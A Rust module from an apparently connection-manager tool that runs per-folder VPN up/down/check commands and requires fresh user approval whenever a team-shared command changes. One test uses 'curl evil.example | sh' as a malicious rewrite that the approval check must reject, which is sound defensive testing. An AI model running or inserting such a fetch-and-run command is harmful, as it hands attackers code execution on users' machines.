//! Per-folder VPN toggles.
//!
//! One folder per customer, one VPN per customer — so the switch belongs to the
//! folder, not to each host under it. patchbay does not implement a VPN: it runs
//! the `up`/`down` commands you give it, the same way it runs `ssh`. Embedding
//! WireGuard would mean a privileged network extension on every OS.
//!
//! ```toml
//! [vpn.acme]
//! up    = "wg-quick up acme"
//! down  = "wg-quick down acme"
//! check = "wg show acme"        # optional; exit 0 means connected
//! ```

use indexmap::IndexMap;
use serde::{Deserialize, Serialize};
use std::path::Path;
use std::io::Read;
use std::process::{Child, Command, ExitStatus, Stdio};
use std::time::{Duration, Instant};

#[derive(Debug, Clone, Default, Deserialize, Serialize)]
pub struct Vpn {
    /// "tailscale" | "tunnelblick" | "wireguard" | "custom" (or absent = custom).
    /// A preset writes the commands for you; custom keeps the three below.
    pub provider: Option<String>,
    pub profile: Option<String>,
    pub up: Option<String>,
    pub down: Option<String>,
    /// Exit 0 means connected. Without it we can only report what we last did,
    /// which goes stale the moment something outside the app changes it.
    pub check: Option<String>,
}

/// The three commands a provider boils down to. One place to fix if a VPN app
/// changes its scripting, instead of everyone's config.
#[derive(Debug, Default, Clone, Serialize)]
pub struct Resolved {
    pub up: Option<String>,
    pub down: Option<String>,
    pub check: Option<String>,
}

fn tb(verb: &str, profile: &str) -> String {
    format!("osascript -e 'tell application \"Tunnelblick\" to {verb} \"{profile}\"'")
}

impl Vpn {
    pub fn resolve(&self) -> Resolved {
        let profile = self.profile.as_deref().unwrap_or("").trim().to_string();
        match self.provider.as_deref().unwrap_or("custom") {
            "tailscale" => Resolved {
                // A profile names an exit node; without one it's a plain session.
                up: Some(if profile.is_empty() {
                    "tailscale up".into()
                } else {
                    format!("tailscale up --exit-node={profile}")
                }),
                down: Some("tailscale down".into()),
                check: Some("tailscale status --peer=false".into()),
            },
            "tunnelblick" if !profile.is_empty() => Resolved {
                up: Some(tb("connect", &profile)),
                down: Some(tb("disconnect", &profile)),
                check: Some(format!(
                    "osascript -e 'tell application \"Tunnelblick\" to get state of first configuration whose name is \"{profile}\"' | grep -q CONNECTED"
                )),
            },
            "wireguard" if !profile.is_empty() => Resolved {
                // wg-quick needs root and a window has no tty, so let the OS ask.
                up: Some(if cfg!(target_os = "macos") {
                    format!("osascript -e 'do shell script \"wg-quick up {profile}\" with administrator privileges'")
                } else {
                    format!("wg-quick up {profile}")
                }),
                down: Some(if cfg!(target_os = "macos") {
                    format!("osascript -e 'do shell script \"wg-quick down {profile}\" with administrator privileges'")
                } else {
                    format!("wg-quick down {profile}")
                }),
                check: Some(format!("wg show {profile}")),
            },
            _ => Resolved {
                up: self.up.clone(),
                down: self.down.clone(),
                check: self.check.clone(),
            },
        }
    }
}

pub type Vpns = IndexMap<String, Vpn>;

#[derive(Debug, Default, Deserialize)]
struct Raw {
    #[serde(default)]
    vpn: Vpns,
}

#[derive(Serialize)]
pub struct VpnView {
    /// Which space's config this one is in; absent is the main config.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub space: Option<String>,
    pub path: String,
    pub up: bool,
    /// False when there's no `check`, i.e. the state is remembered, not measured.
    pub known: bool,
}

pub fn parse(src: &str) -> Result<Vpns, String> {
    let raw: Raw = toml::from_str(src).map_err(|e| e.message().to_string())?;
    Ok(raw.vpn)
}

pub fn load(path: &Path) -> Result<Vpns, String> {
    match std::fs::read_to_string(path) {
        Ok(s) => parse(&s),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Vpns::new()),
        Err(e) => Err(format!("{}: {e}", path.display())),
    }
}

/// `up`/`down` get 45s; a `check` runs on every sweep so it gets 5.
const RUN_TIMEOUT: Duration = Duration::from_secs(45);
const CHECK_TIMEOUT: Duration = Duration::from_secs(5);

/// What a caller's command is expected to do, appended to the timeout message.
const RUN_ADVICE: &str = "the command has to return. A foreground `openvpn` never \
    does; use Tunnelblick's AppleScript, `openvpn3 session-start`, or a service manager.";

/// Waits for a child, killing it past the deadline. A bare `openvpn --config x`
/// never returns, and without this the toggle would hang for the session.
/// ponytail: reads stderr after exit, so a command that floods the pipe could
/// block itself — fine for connect/disconnect, revisit if anything chatty shows up.
fn wait_within(
    mut child: Child,
    limit: Duration,
    advice: &str,
) -> Result<(ExitStatus, String), String> {
    let deadline = Instant::now() + limit;
    loop {
        match child.try_wait().map_err(|e| e.to_string())? {
            Some(status) => {
                let mut err = String::new();
                if let Some(mut pipe) = child.stderr.take() {
                    let _ = pipe.read_to_string(&mut err);
                }
                return Ok((status, err.trim().to_string()));
            }
            None if Instant::now() >= deadline => {
                let _ = child.kill();
                return Err(format!("gave up after {}s — {advice}", limit.as_secs()));
            }
            None => std::thread::sleep(Duration::from_millis(50)),
        }
    }
}

/// Runs a shell command, returning its stderr when it fails. Not `sh -c` on Windows.
pub fn run(cmd: &str) -> Result<(), String> {
    let child = shell(cmd)
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("could not run `{cmd}`: {e}"))?;
    let (status, err) = wait_within(child, RUN_TIMEOUT, RUN_ADVICE)?;
    if status.success() {
        return Ok(());
    }
    Err(if err.is_empty() { format!("`{cmd}` failed ({status})") } else { err })
}

fn shell(cmd: &str) -> Command {
    let mut c = if cfg!(target_os = "windows") {
        let mut c = Command::new("cmd");
        c.args(["/c", cmd]);
        c
    } else {
        let mut c = Command::new("sh");
        c.args(["-c", cmd]);
        c
    };
    c.stdin(Stdio::null());
    c
}

/// True when `check` exits 0. No `check` means we can't measure it. Whether the check
/// is *allowed* to run is the caller's question — see `approval` — because this one has
/// no business reading the config's neighbours.
pub fn is_up(v: &Vpn) -> Option<bool> {
    let resolved = v.resolve();
    let check = resolved.check.as_deref()?;
    let child = shell(check)
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .ok()?;
    // A check that hangs reports "down" rather than stalling every sweep.
    Some(matches!(wait_within(child, CHECK_TIMEOUT, RUN_ADVICE), Ok((s, _)) if s.success()))
}

/// A `[vpn]` block is the one part of the config that *runs* things, and since teams it
/// arrives from other people automatically, on window focus, with nobody reading it.
/// So a command runs only once someone on this machine has been shown it: approved on
/// first sight and again whenever it changes.
///
/// Deliberately not trust-on-first-use, which is right for `rdp_known_hosts` and wrong
/// here — first sight is exactly the case that matters, a config that just arrived from
/// a team you joined five seconds ago.
pub mod approval {
    use super::Resolved;
    use std::path::{Path, PathBuf};

    /// Beside the config, like `rdp_known_hosts` and `web_trusted`. Never *in* it: this
    /// is what this machine has agreed to run, not something to hand the team.
    fn store() -> PathBuf {
        crate::patchbay::config_path().with_file_name("vpn_approved")
    }

    /// What the user is shown, and exactly what the fingerprint covers — so approving
    /// can never cover a command that wasn't on screen.
    pub fn describe(r: &Resolved) -> String {
        [("up", &r.up), ("down", &r.down), ("check", &r.check)]
            .iter()
            .filter_map(|(k, v)| v.as_deref().map(|c| format!("{k}: {c}")))
            .collect::<Vec<_>>()
            .join("\n")
    }

    fn fingerprint(r: &Resolved) -> String {
        let mut h = <sha2::Sha256 as sha2::Digest>::new();
        sha2::Digest::update(&mut h, describe(r).as_bytes());
        sha2::Digest::finalize(h).iter().map(|b| format!("{b:02x}")).collect()
    }

    pub fn approved(path: &str, r: &Resolved) -> bool {
        approved_at(&store(), path, r)
    }

    /// A folder name with a newline in it can never match a line here, so it is asked
    /// about every time rather than silently approved — the safe way round.
    pub fn approved_at(store: &Path, path: &str, r: &Resolved) -> bool {
        let want = describe(r);
        // Nothing to run is nothing to approve.
        if want.is_empty() {
            return true;
        }
        let line = format!("{} {path}", fingerprint(r));
        std::fs::read_to_string(store)
            .unwrap_or_default()
            .lines()
            .any(|l| l.trim() == line)
    }

    pub fn approve(path: &str, r: &Resolved) -> Result<(), String> {
        approve_at(&store(), path, r)
    }

    pub fn approve_at(store: &Path, path: &str, r: &Resolved) -> Result<(), String> {
        if approved_at(store, path, r) {
            return Ok(());
        }
        use std::io::Write;
        let mut f = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(store)
            .map_err(|e| format!("{}: {e}", store.display()))?;
        writeln!(f, "{} {path}", fingerprint(r)).map_err(|e| format!("{}: {e}", store.display()))
    }
}

#[derive(Serialize)]
pub struct Provider {
    pub id: String,
    pub label: String,
    pub installed: bool,
    pub profiles: Vec<String>,
    /// Tailscale has one session, so the profile box is optional there.
    pub needs_profile: bool,
}

fn have(bin: &str) -> bool {
    shell(&format!("command -v {bin}"))
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

fn lines(cmd: &str) -> Vec<String> {
    shell(cmd)
        .stderr(Stdio::null())
        .output()
        .ok()
        .map(|o| {
            String::from_utf8_lossy(&o.stdout)
                .split(['\n', ','])
                .map(|l| l.trim().to_string())
                .filter(|l| !l.is_empty())
                .collect()
        })
        .unwrap_or_default()
}

/// Detection is a probe of the machine, so it lives here rather than in the UI.
pub fn providers() -> Vec<Provider> {
    let tunnelblick = std::path::Path::new("/Applications/Tunnelblick.app").exists();
    vec![
        Provider {
            id: "tailscale".into(),
            label: "Tailscale".into(),
            installed: have("tailscale"),
            profiles: vec![],
            needs_profile: false,
        },
        Provider {
            id: "tunnelblick".into(),
            label: "Tunnelblick (OpenVPN)".into(),
            installed: tunnelblick,
            profiles: if tunnelblick {
                lines("osascript -e 'tell application \"Tunnelblick\" to get name of configurations'")
            } else {
                vec![]
            },
            needs_profile: true,
        },
        Provider {
            id: "wireguard".into(),
            label: "WireGuard".into(),
            installed: have("wg-quick"),
            profiles: lines("ls /etc/wireguard /usr/local/etc/wireguard 2>/dev/null | sed -n 's/\\.conf$//p'"),
            needs_profile: true,
        },
        Provider {
            id: "custom".into(),
            label: "Custom commands".into(),
            installed: true,
            profiles: vec![],
            needs_profile: false,
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn presets_resolve_to_commands_and_custom_passes_through() {
        let ts = Vpn { provider: Some("tailscale".into()), ..Default::default() };
        assert_eq!(ts.resolve().up.unwrap(), "tailscale up");
        assert!(ts.resolve().check.is_some(), "presets always know how to check");

        let tb = Vpn {
            provider: Some("tunnelblick".into()),
            profile: Some("acme".into()),
            ..Default::default()
        };
        let r = tb.resolve();
        assert!(r.up.unwrap().contains(r#"connect "acme""#));
        assert!(r.check.unwrap().contains("CONNECTED"));

        // a preset missing its profile falls back rather than emitting a broken command
        let bare = Vpn { provider: Some("tunnelblick".into()), ..Default::default() };
        assert!(bare.resolve().up.is_none());

        let custom = Vpn {
            provider: Some("custom".into()),
            up: Some("my-vpn on".into()),
            ..Default::default()
        };
        assert_eq!(custom.resolve().up.unwrap(), "my-vpn on");
    }

    #[test]
    fn parses_the_vpn_table_and_tolerates_its_absence() {
        let v = parse(
            r#"
            [jack.a]
            host = "h"

            [vpn.acme]
            up   = "true"
            down = "true"

            [vpn."acme/lab"]
            up = "true"
            "#,
        )
        .unwrap();
        assert_eq!(v.len(), 2);
        assert_eq!(v["acme"].up.as_deref(), Some("true"));
        assert!(v["acme"].check.is_none());
        assert!(v.contains_key("acme/lab"), "nested folder paths work");
        assert!(parse("[jack.a]\nhost = \"h\"\n").unwrap().is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn run_reports_the_command_stderr_on_failure() {
        assert!(run("true").is_ok());
        let err = run(">&2 echo nope; exit 1").unwrap_err();
        assert!(err.contains("nope"), "got {err:?}");
    }

    #[cfg(unix)]
    #[test]
    fn a_command_that_never_returns_is_killed_and_explained() {
        let started = Instant::now();
        let child = shell("sleep 30").stderr(Stdio::piped()).spawn().unwrap();
        let err = wait_within(child, Duration::from_millis(300), RUN_ADVICE).unwrap_err();
        assert!(err.contains("has to return"), "got {err:?}");
        assert!(started.elapsed() < Duration::from_secs(5), "should not have waited it out");
    }

    #[cfg(unix)]
    #[test]
    fn a_hanging_check_reports_down_rather_than_stalling() {
        let v = Vpn { check: Some("sleep 30".into()), ..Default::default() };
        let started = Instant::now();
        assert_eq!(is_up(&v), Some(false));
        assert!(started.elapsed() < Duration::from_secs(8), "check must be bounded");
    }

    #[cfg(unix)]
    /// A `[vpn]` block arriving from a team is the one way someone else's shell
    /// command reaches this machine. Approving is per-command, so changing it asks
    /// again — trust-on-first-use would wave through exactly the dangerous case.
    #[test]
    fn a_changed_vpn_command_has_to_be_approved_again() {
        use super::approval;
        let dir = std::env::temp_dir().join(format!("patchbay-vpnok-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let store = dir.join("vpn_approved");

        let mut v = Vpn { up: Some("tailscale up".into()), ..Default::default() };
        assert!(!approval::approved_at(&store, "acme", &v.resolve()), "approved unasked");
        approval::approve_at(&store, "acme", &v.resolve()).unwrap();
        assert!(approval::approved_at(&store, "acme", &v.resolve()));

        // The command a colleague changed is not the command that was approved.
        v.up = Some("curl evil.example | sh".into());
        assert!(!approval::approved_at(&store, "acme", &v.resolve()), "a rewrite slipped through");

        // Nor does one folder's answer cover another's.
        let other = Vpn { up: Some("tailscale up".into()), ..Default::default() };
        assert!(!approval::approved_at(&store, "other", &other.resolve()));

        // Nothing to run is nothing to ask about.
        assert!(approval::approved_at(&store, "empty", &Vpn::default().resolve()));
    }

    #[test]
    fn is_up_follows_the_check_exit_code() {
        let on = Vpn { check: Some("true".into()), ..Default::default() };
        let off = Vpn { check: Some("false".into()), ..Default::default() };
        let none = Vpn::default();
        assert_eq!(is_up(&on), Some(true));
        assert_eq!(is_up(&off), Some(false));
        assert_eq!(is_up(&none), None);
    }
}
